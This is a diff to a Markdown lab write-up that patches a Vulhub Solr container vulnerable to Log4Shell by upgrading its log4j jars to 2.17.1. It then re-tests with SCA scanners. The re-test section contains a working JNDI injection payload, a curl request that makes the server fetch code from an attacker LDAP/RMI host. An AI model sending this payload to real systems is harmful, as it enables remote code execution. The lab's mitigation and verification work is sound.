@@ -204,8 +204,8 @@ osv-scanner scan -L sbom.cdx.json                # -> GHSA-jfh8-c2jp-5v3q / CVE-
 osv-scanner scan -L sbom.cdx.json --format markdown > ~/log4shell-lab/osv-report.md
 ```
 
-![alt text](Image/osvscannerlog4shell.png)
-Figure: osv-scanner detecting CVE-2021-44228 as GHSA-jfh8-c2jp-5v3q.
+![alt text](Images/osvscannerlog4shell.png)
+*Figure: osv-scanner detecting CVE-2021-44228 as GHSA-jfh8-c2jp-5v3q.*
 
 Running grype to corroborate results:
 
@@ -216,3 +216,92 @@ grype sbom:sbom.json                             # independent agreement on CVE-
 
 ![alt text](Images/grypelog4shell.png)
 *Figure: Grype verifying the presence of the CVE using an independent database.*
+
+### Mitigating the Vulnerability
+
+Run the following to create and execute the patch script on the VM:
+
+```bash
+cat > ~/log4shell-lab/upgrade-log4j.sh <<'EOF'
+#!/usr/bin/env bash
+set -euo pipefail
+MODS="log4j-api log4j-core log4j-slf4j-impl log4j-1.2-api log4j-web log4j-layout-template-json"
+LAB="$HOME/log4shell-lab"
+VH="$LAB/vulhub/log4j/CVE-2021-44228"
+
+# 1) Download the 2.17.1 jars
+mkdir -p "$LAB/log4j-2.17.1" && cd "$LAB/log4j-2.17.1"
+for m in $MODS; do
+  curl -sSfLO "https://repo1.maven.org/maven2/org/apache/logging/log4j/$m/2.17.1/$m-2.17.1.jar"
+done
+echo "Downloaded:"; ls -1 "$LAB/log4j-2.17.1"
+
+# 2) Swap them into the container
+cd "$VH"
+for m in $MODS; do
+  docker compose exec --user root solr rm -f "/opt/solr/server/lib/ext/$m-2.14.1.jar"
+  docker compose cp "$LAB/log4j-2.17.1/$m-2.17.1.jar" \
+    "solr:/opt/solr/server/lib/ext/$m-2.17.1.jar"
+done
+docker compose restart solr
+EOF
+bash ~/log4shell-lab/upgrade-log4j.sh
+
+# Confirm Solr came back up on 2.17.1 (scope the find to server/lib/ext):
+cd ~/log4shell-lab/vulhub/log4j/CVE-2021-44228
+docker compose exec solr find /opt/solr/server/lib/ext -name 'log4j-core-*.jar'   # -> log4j-core-2.17.1.jar
+curl -s -o /dev/null -w '%{http_code}\n' "http://127.0.0.1:8983/solr/"            # -> 200
+```
+
+![alt text](Images/solr-patched.png)
+*Figure: Solr patched to use log4j 2.17.1 by the upgrade script.*
+
+### Re-testing Results
+
+The same exploitation steps and SCA tools should be run on the patched machine.
+
+Remember to re-run this in both terminals:
+
+```bash
+sudo usermod -aG docker "$USER"
+newgrp docker        # or log out and back in once
+docker ps            # should succeed with an empty list, no sudo
+docker network ls                      # note the Vulhub network (e.g. cve-2021-44228_default)
+ATTACKER=$(docker network inspect cve-2021-44228_default -f '{{(index .IPAM.Config 0).Gateway}}')
+TARGET=127.0.0.1
+echo "ATTACKER (Kali host as seen by the container) = $ATTACKER"   # e.g. 172.18.0.1
+echo "TARGET (Solr, from the Kali host)             = $TARGET"
+```
+
+JNDI Kitpaths for exploit:
+
+```
+Target environment(Build in JDK 1.8 whose trustURLCodebase is true):
+rmi://172.18.0.1:1099/77z6kb
+ldap://172.18.0.1:1389/77z6kb
+```
+
+```bash
+curl -g -s "http://$TARGET:8983/solr/admin/cores?action=\${jndi:ldap://$ATTACKER:1389/77z6kb}"
+```
+
+![alt text](Images/RCEPrevented.png)
+*Figure: RCE prevented after the Log4J upgrade.*
+
+SCA REtesting:
+
+```bash
+cd ~/log4shell-lab/vulhub/log4j/CVE-2021-44228
+rm -rf ~/log4shell-lab/solr-ext-fixed
+docker compose cp solr:/opt/solr/server/lib/ext ~/log4shell-lab/solr-ext-fixed
+cd ~/log4shell-lab
+syft dir:solr-ext-fixed -o cyclonedx-json > sbom-fixed.cdx.json
+osv-scanner scan -L sbom-fixed.cdx.json       # log4j 2.17.1 -> no CVE-2021-44228
+grype sbom:sbom-fixed.cdx.json                # confirms clean
+```
+
+![alt text](Images/osvpatched.png)
+*Figure: osv-scanner no longer detecting CVE-2021-44228 in the patched version.*
+
+![alt text](Images/grypepatched.png)
+*Figure: Grype corroborating the patch.*
